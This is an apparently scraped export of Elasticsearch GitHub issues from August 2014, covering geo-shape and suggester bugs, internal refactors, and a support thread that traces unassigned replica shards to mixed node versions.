</description><key id="40797200">7373</key><summary>NPE with geo_bounds agg</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">clintongormley</reporter><labels><label>bug</label></labels><created>2014-08-21T11:58:27Z</created><updated>2014-08-21T18:57:11Z</updated><resolved>2014-08-21T18:57:11Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-21T18:57:11Z" id="52965842">@colings86 apparently this was fixed by upgrading to 1.3.2.

closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Indexing valid multipolygons with high resolution points can fail</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7372</link><project id="" key="" /><description>Multipolygons with high resolution points may fail due to a rounding error that incorrectly detects an overlap. These polygons render correctly on tools like geojsonlint.com but fail in elasticsearch with a 

```
MapperParsingException[failed to parse [geo_shape]]; nested: InvalidShapeException[Self-intersection at or near point
```

For a sample failing polygon see : 
https://gist.github.com/GaelTadh/f9ccae0c703451786da6
</description><key id="40797108">7372</key><summary>Indexing valid multipolygons with high resolution points can fail</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">open</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/nknize/following{/other_user}', u'events_url': u'https://api.github.com/users/nknize/events{/privacy}', u'organizations_url': u'https://api.github.com/users/nknize/orgs', u'url': u'https://api.github.com/users/nknize', u'gists_url': u'https://api.github.com/users/nknize/gists{/gist_id}', u'html_url': u'https://github.com/nknize', u'subscriptions_url': u'https://api.github.com/users/nknize/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/830187?v=4', u'repos_url': u'https://api.github.com/users/nknize/repos', u'received_events_url': u'https://api.github.com/users/nknize/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/nknize/starred{/owner}{/repo}', u'site_admin': False, u'login': u'nknize', u'type': u'User', u'id': 830187, u'followers_url': u'https://api.github.com/users/nknize/followers'}</assignee><reporter username="">GaelTadh</reporter><labels><label>:Geo</label><label>discuss</label></labels><created>2014-08-21T11:56:43Z</created><updated>2015-11-21T17:21:14Z</updated><resolved /><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-08-21T12:35:42Z" id="52913425">Problem seems to be the JTS thinks there is an intersection between two edges which are not at the end points of those edges.  The edges in question can be found in the following gist (there actually may be other cases of intersecting edges but JTS throws an exception on the first one it finds): https://gist.github.com/colings86/ee11d2d5a413014c46e3

The code in JTS which detects this intersection is in RobustLineIntersector line 166 (the exception is thrown from a different location later on).  

This seems to be a rounding issue somewhere but as yet I don't know where (or even whether this is a happening in ES code or in JTS)
</comment><comment author="bogensberger" created="2015-11-12T15:14:35Z" id="156134525">+1
</comment><comment author="clintongormley" created="2015-11-21T17:21:14Z" id="158663189">@nknize one to think about for your work replacing jTS
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make sure that multi_percolate request hands over its context and headers to its corresponding shard requests</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7371</link><project id="" key="" /><description /><key id="40795496">7371</key><summary>Make sure that multi_percolate request hands over its context and headers to its corresponding shard requests</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-21T11:32:40Z</created><updated>2015-06-07T12:12:57Z</updated><resolved>2014-08-21T11:45:45Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-08-21T11:35:49Z" id="52908363">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Test: Write heapdump per default and document -Dtests.heap.size and -Dtests.jvm.argline</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7370</link><project id="" key="" /><description /><key id="40795128">7370</key><summary>Test: Write heapdump per default and document -Dtests.heap.size and -Dtests.jvm.argline</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/brwe/following{/other_user}', u'events_url': u'https://api.github.com/users/brwe/events{/privacy}', u'organizations_url': u'https://api.github.com/users/brwe/orgs', u'url': u'https://api.github.com/users/brwe', u'gists_url': u'https://api.github.com/users/brwe/gists{/gist_id}', u'html_url': u'https://github.com/brwe', u'subscriptions_url': u'https://api.github.com/users/brwe/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/4320215?v=4', u'repos_url': u'https://api.github.com/users/brwe/repos', u'received_events_url': u'https://api.github.com/users/brwe/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/brwe/starred{/owner}{/repo}', u'site_admin': False, u'login': u'brwe', u'type': u'User', u'id': 4320215, u'followers_url': u'https://api.github.com/users/brwe/followers'}</assignee><reporter username="">brwe</reporter><labels /><created>2014-08-21T11:26:44Z</created><updated>2014-08-26T10:09:35Z</updated><resolved>2014-08-26T10:09:04Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-21T12:01:15Z" id="52910436">LGTM
</comment><comment author="s1monw" created="2014-08-21T12:02:29Z" id="52910535">I'd suggest we add a standard heap dump directory to the CI infra and set the path via `build_randomization.rb`
</comment><comment author="brwe" created="2014-08-21T13:58:57Z" id="52923185">Cannot say what would be a good path. Maybe @mrsolo can help?
</comment><comment author="brwe" created="2014-08-21T14:41:41Z" id="52929476">pushed to master (5bfd75e489ef8a21e), 1.x, 1.3 and 1.2 
I leave this open until we know where to write the heap dump to.
</comment><comment author="mrsolo" created="2014-08-21T19:16:24Z" id="52968288">@brewe how about setting default heap dump location to ${basedir}/logs?
</comment><comment author="brwe" created="2014-08-26T10:09:03Z" id="53399788">Ok, opened https://github.com/elasticsearch/elasticsearch/pull/7452 for the heap dump location.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Bugs with encoding multiple levels of geo precision</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7369</link><project id="" key="" /><description>1) One issue reported by a user is due to the truncation of the geohash string. Added YAML test for this scenario
2) Another suspect piece of code was the &#8220;toAutomaton&#8221; method that only merged the first of possibly many precisions into the result.

Closes #7368
</description><key id="40793848">7369</key><summary>Bugs with encoding multiple levels of geo precision</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/markharwood/following{/other_user}', u'events_url': u'https://api.github.com/users/markharwood/events{/privacy}', u'organizations_url': u'https://api.github.com/users/markharwood/orgs', u'url': u'https://api.github.com/users/markharwood', u'gists_url': u'https://api.github.com/users/markharwood/gists{/gist_id}', u'html_url': u'https://github.com/markharwood', u'subscriptions_url': u'https://api.github.com/users/markharwood/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/170925?v=4', u'repos_url': u'https://api.github.com/users/markharwood/repos', u'received_events_url': u'https://api.github.com/users/markharwood/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/markharwood/starred{/owner}{/repo}', u'site_admin': False, u'login': u'markharwood', u'type': u'User', u'id': 170925, u'followers_url': u'https://api.github.com/users/markharwood/followers'}</assignee><reporter username="">markharwood</reporter><labels><label>:Suggesters</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-21T11:07:26Z</created><updated>2015-06-07T19:04:15Z</updated><resolved>2014-08-29T13:14:49Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-29T12:18:34Z" id="53868151">LGTM
</comment><comment author="markharwood" created="2014-08-29T13:14:49Z" id="53873800">Committed in https://github.com/elasticsearch/elasticsearch/commit/c0aef4adc4ffaf791ed9a42864cc578b7dc50ffc 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Suggester:  No results returned for certain geo precisions</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7368</link><project id="" key="" /><description>An encoding issue in GeolocationContextMapping means that certain precision levels are being skipped and consequently cannot be queried.
Partial YAML test here: 

```
setup:
  - do:
      indices.create:
          index: test
          body:
            mappings:
              test:
                "properties":
                  "suggest_geo_multi_level":
                     "type" : "completion"
                     "context":
                        "location":
                            "type" : "geo"
                            "precision" : [1,2,3,4,5,6,7,8,9,10,11,12]
  - do:
      index:
        index: test
        type:  test
        id:    1
        body:
          suggest_geo_multi_level:
            input: "Hotel Marriot in Amsterdam"
            context:
              location:
                lat : 52.22
                lon : 4.53
```

This call works:

```
  - do:
      suggest:
        index: test
        body:
          result:
            text: "hote"
            completion:
              field: suggest_geo_multi_level
              context:
                location:
                  lat : 52.22
                  lon : 4.53
                  precision : 3                  
  - length: { result: 1  }
```

but a precision length of 4 does not. In fact precisions 1,2,3 and 12 work and all others fail.
So there are gaps in the encoding of the data.
The reason is that the encoding logic is given precisions in this order:  [12, 3, 10, 6, 2, 1, 7, 11, 9, 5, 4, 8]
and the encoding logic mistakenly truncates the "geohash" string while in this loop:

```
    for (String geohash : geohashes) {
        for (int p : mapping.precision) {
            int precision = Math.min(p, geohash.length());
            geohash = geohash.substring(0, precision);
            if(mapping.neighbors) {
                GeoHashUtils.addNeighbors(geohash, precision, locations);
            }
            locations.add(geohash);
        }
    }
```

The required fix is to not change the "geohash" string value in the inner loop which ensures all precisions are then encoded correctly.
</description><key id="40791205">7368</key><summary>Suggester:  No results returned for certain geo precisions</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/markharwood/following{/other_user}', u'events_url': u'https://api.github.com/users/markharwood/events{/privacy}', u'organizations_url': u'https://api.github.com/users/markharwood/orgs', u'url': u'https://api.github.com/users/markharwood', u'gists_url': u'https://api.github.com/users/markharwood/gists{/gist_id}', u'html_url': u'https://github.com/markharwood', u'subscriptions_url': u'https://api.github.com/users/markharwood/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/170925?v=4', u'repos_url': u'https://api.github.com/users/markharwood/repos', u'received_events_url': u'https://api.github.com/users/markharwood/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/markharwood/starred{/owner}{/repo}', u'site_admin': False, u'login': u'markharwood', u'type': u'User', u'id': 170925, u'followers_url': u'https://api.github.com/users/markharwood/followers'}</assignee><reporter username="">markharwood</reporter><labels><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-21T10:27:41Z</created><updated>2014-09-08T15:11:32Z</updated><resolved>2014-08-29T13:09:28Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Clarify XContentParser/Builder interface for binary vs. utf8 values</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7367</link><project id="" key="" /><description>Today we have very confusing naming since some methods names claim to
read binary but in fact read utf-16 and convert to utf-8 under the hood.
This commit clarifies the interfaces and adds additional documentation.
</description><key id="40787102">7367</key><summary>Clarify XContentParser/Builder interface for binary vs. utf8 values</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-21T09:29:30Z</created><updated>2015-06-07T12:13:09Z</updated><resolved>2014-08-21T10:05:09Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-21T09:32:17Z" id="52897952">LGTM, thanks for cleaning  this up and adding documentation...
</comment><comment author="s1monw" created="2014-08-21T09:36:16Z" id="52898334">@jpountz what do you think about this one [nocommit](https://github.com/elasticsearch/elasticsearch/pull/7367/files#diff-33828661b1a3cef1185d8f4c27113911R127)?
</comment><comment author="jpountz" created="2014-08-21T09:42:36Z" id="52898913"> @s1monw it feels wrong to me but this has always been this way so I'm afraid some of our code relies on this behavior. Maybe downgrade the nocommit to a TODO and try to address it in a separate change?
</comment><comment author="s1monw" created="2014-08-21T09:42:57Z" id="52898949">++ will do
</comment><comment author="s1monw" created="2014-08-21T09:46:20Z" id="52899264">@jpountz updated - I think it's ready
</comment><comment author="jpountz" created="2014-08-21T09:46:45Z" id="52899312">Agreed, lgtm
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Remove CacheRecycler.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7366</link><project id="" key="" /><description>The main consumer of this API was the faceting module. Now that it's gone,
let's remove CacheRecycler as well.
</description><key id="40785247">7366</key><summary>Remove CacheRecycler.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels><label>:Internal</label><label>enhancement</label><label>non-issue</label><label>v2.0.0-beta1</label></labels><created>2014-08-21T09:03:13Z</created><updated>2015-06-08T14:31:58Z</updated><resolved>2014-08-21T09:21:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-21T09:20:29Z" id="52896893">w00t +1 LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>java filtered query requires query</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7365</link><project id="" key="" /><description>queryBuilder is not Nullable in FilteredQueryBuilder.
Using json/http it is optional.
Example in the documentation:
http://www.elasticsearch.org/guide/en/elasticsearch/guide/current/_filtering_queries_and_aggregations.html

The workaround is to use a matchAllQuery.
</description><key id="40785185">7365</key><summary>java filtered query requires query</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">brackxm</reporter><labels /><created>2014-08-21T09:02:30Z</created><updated>2014-08-29T07:43:38Z</updated><resolved>2014-08-29T07:43:38Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-21T09:05:46Z" id="52895506">Thanks for the report, this looks wrong indeed.
</comment><comment author="brackxm" created="2014-08-21T09:12:56Z" id="52896186">Is there a performance difference between a matchAllQuery and no query?
</comment><comment author="jpountz" created="2014-08-21T09:15:46Z" id="52896460">No. Actually the parser uses a `match_all` query when no query is specified, so this is mostly equivalent, the only thing that you pay for is the serialization of the `match_all` query, but that should be nothing.
</comment><comment author="brackxm" created="2014-08-22T09:28:05Z" id="53040823">not sure how adoptme is supposed to work, but i'll have a go
</comment><comment author="clintongormley" created="2014-08-22T09:29:33Z" id="53040958">@brackxm great!  
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Shard stuck in INITIALIZING state</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7364</link><project id="" key="" /><description>I stopped one of my elastic search node &amp; as a normal behavior elastic search started relocating my shard on that node to another node.

But even after 15 hours it is still stuck in INITIALIZING state. Also that shard is fluctuating between two nodes,for some time it stays on one node then automatically shift to another node &amp; keep on doing that after every few hours.

Main issue is it is still in INITIALIZING state after so many hours.

I am using version 1.2.1.

This shard which is stuck, it is a replica.

I am getting this error in logs:

[ERROR][index.engine.internal    ] [mynode] [myindex][3] failed to acquire searcher, source delete_by_query
java.lang.NullPointerException
[WARN ][index.engine.internal    ] [mynode] [myindex][3] failed engine [deleteByQuery/shard failed on replica]
[WARN ][cluster.action.shard     ] [mynode] [myindex][3] sending failed shard for [myindex][3], node[Sp3URfNVQlq2i4i3EjCakw], [R], s[INITIALIZING], indexUUID [kTikCHshQMKEQ_jAuWWWnw], reason [engine failure, message [deleteByQuery/shard failed on replica][EngineException[[myindex][3] failed to acquire searcher, source delete_by_query]; nested: NullPointerException; ]]

Only fix i got is:

I stopped deleteByQuery from my code.

Then i dropped all replicas &amp; recreated them. Once all got stabilized.

I restarted deleteByQuery in my code.

That's how it worked for me &amp; all back to normal.

Here is the link for SO question:http://stackoverflow.com/questions/25418094/elasticsearch-shard-stuck-in-initializing-state

My Delete query is:

{
    "query": {
        "filtered": {
            "filter": {
                "term": {
                    "id": 123
                }
            }
        }
    }
}
</description><key id="40781699">7364</key><summary>Shard stuck in INITIALIZING state</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">cpeeyush</reporter><labels><label>adoptme</label><label>bug</label></labels><created>2014-08-21T08:10:45Z</created><updated>2015-11-21T17:20:12Z</updated><resolved>2015-11-21T17:20:12Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-08-22T01:37:16Z" id="53011894">we fixed a few places where a shard might be stuck during recovery in 1.3, I wonder if you hit one of those...
</comment><comment author="clintongormley" created="2014-08-22T15:18:36Z" id="53073575">Still need to investigate why the delete-by-query is throwing NPEs
</comment><comment author="clintongormley" created="2015-11-21T17:20:11Z" id="158663134">Delete by query has been completely reimplemented in 2.0.  Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Unassigned shards</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7363</link><project id="" key="" /><description>I have set up an ELK system to monitor some webserver accesslogs and other stuff.
Started out with 1 webserver running logstash-forwarder and 1 server running logstash and elasticsearch. Then I added 2 other webservers also running logstash-forwarder. All seemed fine.

But as soon as I added another server with logstash + elasticsearch, I started to see unassigned shards, specifically replicas. I have the default of 5 shards and 1 replica.

Every day a few replica shards don't seem to get assigned to the other node.
Logstash is version 1.4.2-1-2c0f5a1
Elasticsearch is version 1.3.1
They were installed using the official debian repositories from elasticsearch.org

I was not able to spot any errors or other messages related to shard failures in the log on any of the ES nodes. Unassigned shards not only happen for logstash indices but also for marvel ones.

Right now the cluster is operational but as soon as I get a hardware failure on one of the nodes I'll encounter dataloss.

I tried to set replicas to 0 and cluster went to green. Set it back to 1 and the exact same shards are unassigned once again and cluster stays in yellow. I use the HQ plugin to monitor cluster state.

What could be the cause for unassigned shards and how can I prevent this from happening?
I have found quite a bunch of people having the same issue via google with various approaches how to solve this problem but nothing conclusive.
Restarting any of the nodes, nor bringing the whole cluster down and back up helped.
</description><key id="40781470">7363</key><summary>Unassigned shards</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">arctica</reporter><labels><label>feedback_needed</label></labels><created>2014-08-21T08:07:17Z</created><updated>2014-08-25T16:15:44Z</updated><resolved>2014-08-25T16:15:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-22T13:43:12Z" id="53061546">What settings do you have in your `config/elasticsearch.yml` files, and returned by:

```
curl localhost:9200/_cluster/settings
curl localhost:9200/_settings
```
</comment><comment author="arctica" created="2014-08-25T09:24:39Z" id="53244112">The config/elasticsearch.yml file can be seen in this [gist](https://gist.github.com/arctica/78ad8064a457005cf4ad)
The only changes were the clustername, node name, discovery hosts and the last two lines for tuning.

```
# curl localhost:9200/_cluster/settings
{"persistent":{},"transient":{}}
```

[# curl localhost:9200/_settings](https://gist.github.com/arctica/a240a742a83fc17cf3d5) (gist as it is a bit longer)

An interesting thing I noticed is that shards 0-3 have the primary on server A and a replica on server B. Then shard 4 has a primary on server B but no replica on server A.
This seems to be the case for all logstash indices created recently.
</comment><comment author="clintongormley" created="2014-08-25T09:43:54Z" id="53245713">Hi @arctica 

I don't see bad settings. The reason why replicas are not assigned must be logged - we need to see those logs in order to debug further.  Also, you can increase the recovery logging with this request:

```
PUT /_cluster/settings
{
  "transient": {
    "logger.indices.recovery": "DEBUG"
  }
}
```
</comment><comment author="arctica" created="2014-08-25T12:19:58Z" id="53256632">I changed the setting as you described and restarted server B to trigger recovery. I could not find any messages about failed recoveries. I saw a lot of messages like

```
... [logstash-2014.08.24][2] recovery completed from ...
```

But none for [4], which is unassigned. For [0] to [3] I saw also on server A this message:

```
... delaying recovery of [logstash-2014.08.24][2] ...
```

In theory I should see on server B the delaying message for the shard in question and the completed message on server A. But there is just nothing :(

A bit off topic but once I brought server B back up, I saw a lot of network and disk activity during recovery. Is it normal that B fetches a lot (all?) data from server A? The recovery took also a bit longer than expected (15-20min?)
</comment><comment author="clintongormley" created="2014-08-25T12:59:02Z" id="53260300">If your shards on B have diverged from A (which happens over time) then they need to copy all segments across, which is normal.  The delay happening on the source node is also normal, as too many recoveries happening at the same time would kill I/O.

You can check on the progress of recovery with:

```
GET /_cat/recovery?v
```

So have your nodes recovered now, or what is happening?
</comment><comment author="arctica" created="2014-08-25T13:21:33Z" id="53262448">Hi Clinton,

the cluster went into the same state (yellow) as before with a bunch of replicas unassigned.
Here the output of /_cat/recovery?v:

```
logstash-2014.08.24 0     37510 replica done  A B n/a        n/a      185   97.8%         378937306 100.0%        
logstash-2014.08.24 0     167   gateway done  A A n/a        n/a      0     0.0%          0         0.0%          
logstash-2014.08.24 1     27762 replica done  A B n/a        n/a      173   100.0%        379386605 100.0%        
logstash-2014.08.24 1     159   gateway done  A A n/a        n/a      0     0.0%          0         0.0%          
logstash-2014.08.24 2     22048 replica done  A B n/a        n/a      173   99.4%         377834450 100.0%        
logstash-2014.08.24 2     171   gateway done  A A n/a        n/a      0     0.0%          0         0.0%          
logstash-2014.08.24 3     40162 replica done  A B n/a        n/a      182   100.0%        382053862 100.0%        
logstash-2014.08.24 3     164   gateway done  A A n/a        n/a      0     0.0%          0         0.0%          
logstash-2014.08.24 4     235   gateway done  B B n/a        n/a      187   100.0%        376405639 100.0%         
```

Note how there are 2 entries for shards 0, 1, 2 and 3 but only one for shard 4. Consistent with the missing of any log entries for that replica. It's as if the replica does not exist at all.

Since logstash creates an index every day, shouldn't old shards not diverge? They are not modified once the day is over and transfering all that data around when restarting a node seems a bit wasteful especially once I reached hundreds of gigabytes in logs. Even with gigabit ethernet that's gonna take a good while.
</comment><comment author="clintongormley" created="2014-08-25T14:27:09Z" id="53270461">&gt; Since logstash creates an index every day, shouldn't old shards not diverge? They are not modified once the day is over and transfering all that data around when restarting a node seems a bit wasteful especially once I reached hundreds of gigabytes in logs. Even with gigabit ethernet that's gonna take a good while.

Documents are indexed on the primary and an the replica independently, and refreshes happen at different times, which is why segments diverge.  #6069 is about improving that.

&gt; Note how there are 2 entries for shards 0, 1, 2 and 3 but only one for shard 4. Consistent with the missing of any log entries for that replica. It's as if the replica does not exist at all.

That is very weird!  Could you also provide me the output of this command:

```
curl -XGET "http://localhost:9200/_cluster/state/routing_table,routing_nodes/logstash-2014.08.24"
```
</comment><comment author="arctica" created="2014-08-25T14:39:10Z" id="53272184">Great to hear recovery is being made fast. It was not a big concern for me right now but would probably cause issues later on as we grow our data in size.

Here is the output of the command you asked for in a [gist](https://gist.github.com/arctica/8afb631e800d444c545e)

Shard 4 has a working primary but the replica has null values for both "node" aswell as "relocating_node". To me it seems as if that replica never got assigned in the first place and even recovery does not attempt to assign it.
</comment><comment author="clintongormley" created="2014-08-25T14:46:29Z" id="53273124">Ah OK - so it is just unassigned, not missing.  OK, what's the output of this command:

```
 curl -XGET "http://localhost:9200/_cluster/health/?level=indices"
```
</comment><comment author="arctica" created="2014-08-25T14:53:34Z" id="53274107">Please find the output in this [gist](https://gist.github.com/arctica/1a2750d5ebc07dc972ed)
Indeed the replica is unassigned and not missing. And you can also clearly see it is always the case for one shard per logstash index/day.
</comment><comment author="clintongormley" created="2014-08-25T15:00:22Z" id="53275058">@arctica another question - how much free space do you have on your disks?
</comment><comment author="arctica" created="2014-08-25T15:09:02Z" id="53276310">26GB data so far, 1.7TB still free on each node. Or roughly a 2% usage.
There is also plenty of RAM free, no swapping going on.
</comment><comment author="clintongormley" created="2014-08-25T15:18:05Z" id="53277607">OK, could you try this command and post the output:

```
curl -XPOST "http://localhost:9200/_cluster/reroute?explain" -d'
{
  "commands": [
    {
      "allocate": {
        "index": "logstash-2014.08.24",
        "shard": 4,
        "node": "N_HxeTu8StmMR_6sTk2faQ"
      }
    }
  ]
}'
```
</comment><comment author="arctica" created="2014-08-25T15:44:17Z" id="53281723">Clinton: I think you pointed at the solution, great!
Here is the output as a [gist](https://gist.github.com/arctica/e95a2b8759d34af19a82) warning, it's quite big.

Basically it seems that node A is running ES version 1.3.1 and when I set up node B a week later or so, version 1.3.2 had been released in the meantime. For whatever reason, shard 4 always ends up being primary on B while the others are primary on A.

Replicating from 1.3.1 (A) -&gt; 1.3.2 (B) works fine while the other way does not. I guess that makes sense.

I will bring the cluster down, upgrade A to 1.3.2 and start the cluster back up. In theory that should fix the problem. I'll report back once that is finished.
</comment><comment author="arctica" created="2014-08-25T15:52:54Z" id="53283037">Sorry but I think the last gist got cut off, probably because it was too big.
The relevant part is:

``` json
  {"explanations": [
    {
      "command": "allocate",
      "parameters": {
        "index": "logstash-2014.08.24",
        "shard": 4,
        "node": "N_HxeTu8StmMR_6sTk2faQ",
        "allow_primary": false
      },
      "decisions": [
        {
          "decider": "same_shard",
          "decision": "YES",
          "explanation": "shard is not allocated to same node or host"
        },
        {
          "decider": "filter",
          "decision": "YES",
          "explanation": "node passes include\/exclude\/require filters"
        },
        {
          "decider": "replica_after_primary_active",
          "decision": "YES",
          "explanation": "primary is already active"
        },
        {
          "decider": "throttling",
          "decision": "YES",
          "explanation": "below shard recovery limit of [2]"
        },
        {
          "decider": "enable",
          "decision": "YES",
          "explanation": "allocation disabling is ignored"
        },
        {
          "decider": "disable",
          "decision": "YES",
          "explanation": "allocation disabling is ignored"
        },
        {
          "decider": "awareness",
          "decision": "YES",
          "explanation": "no allocation awareness enabled"
        },
        {
          "decider": "shards_limit",
          "decision": "YES",
          "explanation": "total shard limit disabled: [-1] &lt;= 0"
        },
        {
          "decider": "node_version",
          "decision": "NO",
          "explanation": "target node version [1.3.1] is older than source node version [1.3.2]"
        },
        {
          "decider": "disk_threshold",
          "decision": "YES",
          "explanation": "disk usages unavailable"
        },
        {
          "decider": "snapshot_in_progress",
          "decision": "YES",
          "explanation": "shard not primary or relocation disabled"
        }
      ]
    }
  ]}
```
</comment><comment author="clintongormley" created="2014-08-25T15:54:42Z" id="53283298">OK - so you've got mixed versions of ES by the looks of it.  You need to upgrade all of your nodes to the same version.

```
    {
      "decider": "node_version",
      "decision": "NO",
      "explanation": "target node version [1.3.1] is older than source node version [1.3.2]"
    },
```
</comment><comment author="arctica" created="2014-08-25T15:59:46Z" id="53284087">Upgraded server A to 1.3.2, restarted cluster and we're back to green :)

Also recovery was way faster this time around. Maybe the slow recovery before was also caused by the version mismatch?

Anyways, I am glad the issue is resolved and would like to thank you, Clinton for your help! Much appreciated.

I think the visiblity of problems like this one needs to be improved, as I feel a lot of time could have been saved if the problem was more obvious.
Feel free to use this issue as a feature request or we can close it and make a new one.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>If _parent field points to a non existing parent type, then skip the has_parent query/filter</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7362</link><project id="" key="" /><description>PR for #7349
